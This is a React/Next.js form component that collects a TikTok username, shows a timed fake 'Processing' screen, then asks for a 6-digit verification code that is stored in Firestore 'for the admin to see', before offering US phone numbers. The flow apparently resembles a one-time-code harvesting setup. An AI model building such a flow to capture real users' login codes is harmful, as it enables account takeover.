"use client";

import { useState, useEffect } from "react";
import type { EmblaCarouselType } from 'embla-carousel-react'
import { zodResolver } from "@hookform/resolvers/zod";
import * as z from "zod";
import { useForm } from "react-hook-form";
import { User, Phone, KeyRound, CheckCircle, Loader2, AtSign, Check, X } from "lucide-react";
import { collection, doc, addDoc, updateDoc } from "firebase/firestore";
import { useRouter } from "next/navigation";

import { Button } from "@/components/ui/button";
import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from "@/components/ui/form";
import { Progress } from "@/components/ui/progress";
import { ScrollArea } from "@/components/ui/scroll-area";
import { Carousel, CarouselContent, CarouselItem, type CarouselApi } from "@/components/ui/carousel"
import { useCollection, useFirestore, useMemoFirebase } from "@/firebase";
import { cn } from "@/lib/utils";
import { TikTokLogo } from "./icons/tiktok-logo";

const TIKTOK_BRIDGE_STEPS = [
  { step: 1, title: "Your TikTok", icon: User, fields: ['username'] as const },
  { step: 2, title: "Processing...", icon: TikTokLogo, fields: [] as const },
  { step: 3, title: "Enter Code", icon: KeyRound, fields: ['verificationCode'] as const },
  { step: 4, title: "Select a Number", icon: Phone, fields: ['usNumber'] as const },
  { step: 5, title: "Completed", icon: CheckCircle, fields: [] as const },
];

const formSchema = z.object({
  username: z.string().min(2, "Username must be at least 2 characters."),
  verificationCode: z.string().length(6, "Code must be 6 digits."),
  usNumber: z.string({ required_error: "Please select a number." }),
});

type FormValues = z.infer<typeof formSchema>;

interface PhoneNumber {
    id: string;
    phoneNumber: string;
    isAvailable: boolean;
    region: string;
    state: string;
    benefits: string[];
    disadvantages: string[];
    bonuses: string[];
}

export function TikTokBridgeForm() {
  const [api, setApi] = useState<CarouselApi>()
  const [currentStep, setCurrentStep] = useState(0)
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submissionId, setSubmissionId] = useState<string | null>(null);
  const firestore = useFirestore();
  const router = useRouter();

  const phoneNumbersQuery = useMemoFirebase(() => {
      if (!firestore) return null;
      return collection(firestore, 'phone_numbers');
  }, [firestore]);
  const { data: phoneNumbers, isLoading: phoneNumbersLoading } = useCollection<PhoneNumber>(phoneNumbersQuery);

  const form = useForm<FormValues>({
    resolver: zodResolver(formSchema),
    mode: 'onChange',
  });
    
  useEffect(() => {
    // On component mount, check if there's a submission ID in localStorage
    const storedId = localStorage.getItem('submissionId');
    if (storedId) {
      setSubmissionId(storedId);
    }
  }, []);
    
  const handleNext = async () => {
    const fieldsToValidate = TIKTOK_BRIDGE_STEPS[currentStep]?.fields;
    if (fieldsToValidate) {
        const isValid = await form.trigger(fieldsToValidate);
        if (!isValid) return;
    }

    if (!api) return;

    setIsSubmitting(true);

    try {
        if (!firestore) throw new Error("Firestore not available");
        // Step 1 -> 2 (Username)
        if (currentStep === 0) {
            const { username } = form.getValues();
            const submissionData = { 
                tiktokUsername: username, 
                isVerified: false, 
                createdAt: new Date(),
                verificationCode: null,
                phoneNumberId: null,
                phoneNumber: null,
            };
            // Use await here to ensure we get the docRef before proceeding
            const docRef = await addDoc(collection(firestore, "tiktok_users"), submissionData);
            setSubmissionId(docRef.id);
            if (typeof window !== 'undefined') {
                localStorage.setItem('submissionId', docRef.id);
            }
            
            api.scrollNext(); // Go to loading step
            setTimeout(() => {
                api.scrollNext(); // Go to code entry step
                setIsSubmitting(false);
            }, 5000);
            return;
        }
        
        // Step 3 -> 4 (Verification Code)
        if (currentStep === 2) {
            if (!submissionId) throw new Error("Submission ID not found");
            const { verificationCode } = form.getValues();
            const submissionDocRef = doc(firestore, 'tiktok_users', submissionId);
            await updateDoc(submissionDocRef, { verificationCode });
            api.scrollNext();
        }

        // Step 4 -> 5 (Select Number & Final Submission)
        if (currentStep === 3) {
            if (!submissionId) throw new Error("Submission ID not found");
            
            const { usNumber } = form.getValues();
            const selectedPhoneNumberDoc = phoneNumbers?.find(p => p.phoneNumber === usNumber);
            if (!selectedPhoneNumberDoc) throw new Error("Selected phone number not found");

            const submissionDocRef = doc(firestore, 'tiktok_users', submissionId);
            const finalData = {
                phoneNumberId: selectedPhoneNumberDoc.id,
                phoneNumber: selectedPhoneNumberDoc.phoneNumber,
            };

            await updateDoc(submissionDocRef, finalData); 
            
            router.push('/waiting-for-approval');
            return; // Prevent setIsSubmitting(false) from running
        }

    } catch (e) {
        console.error("An error occurred: ", e);
    } finally {
        // Don't set isSubmitting to false for the async username step
        if (currentStep !== 0) {
            setIsSubmitting(false);
        }
    }
  };


  const handlePrev = () => {
    if (isSubmitting || currentStep === 1) return; // Don't allow going back from loading screen
    api?.scrollPrev();
  };
  
  useEffect(() => {
    if (!api) return

    const onSelect = (emblaApi: EmblaCarouselType) => {
      setCurrentStep(emblaApi.selectedScrollSnap())
    }

    api.on("select", onSelect);
    onSelect(api);

    return () => {
      api.off("select", onSelect);
    };
  }, [api])
  
  const CurrentIcon = TIKTOK_BRIDGE_STEPS[currentStep].icon;
  const progressValue = Math.max(0, ((currentStep - (currentStep > 1 ? 1: 0)) / (TIKTOK_BRIDGE_STEPS.length - 2)) * 100);

  return (
    <Card>
      <CardHeader>
        <Progress value={progressValue} className="mb-4" />
        <div className="flex items-center space-x-3 min-h-[48px]">
            <div className={cn(
                "flex h-8 w-8 items-center justify-center rounded-full bg-primary text-primary-foreground shrink-0",
                 currentStep === 1 && "animate-pulse"
            )}>
                <CurrentIcon className={cn("h-5 w-5", currentStep === 1 && "h-8 w-8")} />
            </div>
            <div>
                <CardTitle className="font-headline">{TIKTOK_BRIDGE_STEPS[currentStep].title}</CardTitle>
                {currentStep < TIKTOK_BRIDGE_STEPS.length - 1 && currentStep !== 1 &&
                    <CardDescription>Step {currentStep > 1 ? currentStep-1 : currentStep+1} of {TIKTOK_BRIDGE_STEPS.length - 2}</CardDescription>
                }
            </div>
        </div>
      </CardHeader>
      <Form {...form}>
        <form onSubmit={(e) => e.preventDefault()}>
          <CardContent className="min-h-[380px]">
            <Carousel setApi={setApi} opts={{ watchDrag: false, allowTouchMove: false }} className="w-full">
              <CarouselContent>
                {/* Step 1: Username */}
                <CarouselItem>
                  <FormField
                    control={form.control}
                    name="username"
                    render={({ field }) => (
                      <FormItem className="pt-2">
                        <FormLabel>TikTok Username</FormLabel>
                        <FormControl>
                          <div className="relative">
                            <AtSign className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
                            <Input placeholder="your_username" {...field} className="pl-10" />
                          </div>
                        </FormControl>
                        <FormMessage />
                      </FormItem>
                    )}
                  />
                </CarouselItem>

                {/* Step 2: Loading Spinner */}
                <CarouselItem>
                    <div className="text-center py-8 flex flex-col items-center justify-center h-[300px]">
                        <TikTokLogo className="h-20 w-20 text-primary animate-pulse" />
                        <h3 className="text-xl font-semibold mt-4">Processing...</h3>
                        <p className="text-muted-foreground mt-2 max-w-[250px]">Please wait a moment.</p>
                    </div>
                </CarouselItem>

                {/* Step 3: Verification Code */}
                <CarouselItem>
                   <FormField
                    control={form.control}
                    name="verificationCode"
                    render={({ field }) => (
                      <FormItem className="pt-2">
                        <FormLabel>Verification Code</FormLabel>
                        <FormControl>
                            <Input placeholder="123456" {...field} />
                        </FormControl>
                        <p className="text-sm text-muted-foreground pt-1">Enter any 6-digit code for the admin to see.</p>
                        <FormMessage />
                      </FormItem>
                    )}
                  />
                </CarouselItem>

                {/* Step 4: Select Number */}
                <CarouselItem>
                  <FormField
                    control={form.control}
                    name="usNumber"
                    render={({ field }) => (
                      <FormItem className="pt-2">
                        <FormLabel>Choose a US Number</FormLabel>
                        <FormMessage className="pb-2"/>
                        <FormControl>
                          <ScrollArea className="h-80 w-full pr-4">
                            <div className="space-y-3">
                              {phoneNumbersLoading ? (
                                <div className="flex justify-center items-center h-64">
                                    <Loader2 className="animate-spin" />
                                </div>
                              ) : (
                                phoneNumbers?.filter(n => n.isAvailable).map((number) => (
                                    <Card 
                                        key={number.id} 
                                        onClick={() => field.onChange(number.phoneNumber)}
                                        className={cn(
                                            "cursor-pointer transition-all hover:bg-accent/50",
                                            field.value === number.phoneNumber && "border-primary bg-accent/20"
                                        )}
                                    >
                                        <CardHeader className="p-4">
                                            <div className="flex justify-between items-start">
                                                <div>
                                                    <CardTitle className="text-lg">{number.phoneNumber}</CardTitle>
                                                    <CardDescription>{number.region}, {number.state}</CardDescription>
                                                </div>
                                                {field.value === number.phoneNumber && (
                                                    <div className="flex h-6 w-6 items-center justify-center rounded-full bg-primary text-primary-foreground shrink-0">
                                                        <Check className="h-4 w-4" />
                                                    </div>
                                                )}
                                            </div>
                                        </CardHeader>
                                        <CardContent className="p-4 pt-0 text-sm">
                                             {number.bonuses && number.bonuses.length > 0 && (
                                                <div className="mb-3">
                                                    <h4 className="font-semibold mb-1 text-primary">Bonuses</h4>
                                                    <ul className="list-disc pl-5 space-y-1 text-foreground/80">
                                                        {number.bonuses.map((bonus, i) => <li key={i}>{bonus}</li>)}
                                                    </ul>
                                                </div>
                                            )}
                                            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                                                <div>
                                                    <h4 className="font-semibold mb-2 flex items-center text-green-600"><Check className="h-4 w-4 mr-2"/>Benefits</h4>
                                                    <ul className="list-none pl-0 space-y-1 text-muted-foreground">
                                                         {number.benefits.map((benefit, i) => <li key={i} className="flex items-start"><Check className="h-4 w-4 mr-2 mt-1 text-green-500 shrink-0"/><span>{benefit}</span></li>)}
                                                    </ul>
                                                </div>
                                                <div>
                                                    <h4 className="font-semibold mb-2 flex items-center text-red-600"><X className="h-4 w-4 mr-2"/>Disadvantages</h4>
                                                    <ul className="list-none pl-0 space-y-1 text-muted-foreground">
                                                        {number.disadvantages.map((disadvantage, i) => <li key={i} className="flex items-start"><X className="h-4 w-4 mr-2 mt-1 text-red-500 shrink-0"/><span>{disadvantage}</span></li>)}
                                                    </ul>
                                                </div>
                                            </div>
                                        </CardContent>
                                    </Card>
                                ))
                              )}
                            </div>
                          </ScrollArea>
                        </FormControl>
                      </FormItem>
                    )}
                  />
                </CarouselItem>
                
              </CarouselContent>
            </Carousel>
          </CardContent>
          
          {currentStep < 4 && currentStep !== 1 && (
            <CardFooter className="flex justify-between">
              <Button type="button" variant="ghost" onClick={handlePrev} disabled={currentStep === 0 || isSubmitting}>Back</Button>
              <Button type="button" onClick={handleNext} disabled={isSubmitting || (currentStep === 3 && phoneNumbersLoading)}>
                {isSubmitting ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : null}
                {currentStep === 3 ? "Finish & Wait for Approval" : "Continue"}
              </Button>
            </CardFooter>
          )}
        </form>
      </Form>
    </Card>
  );
}

    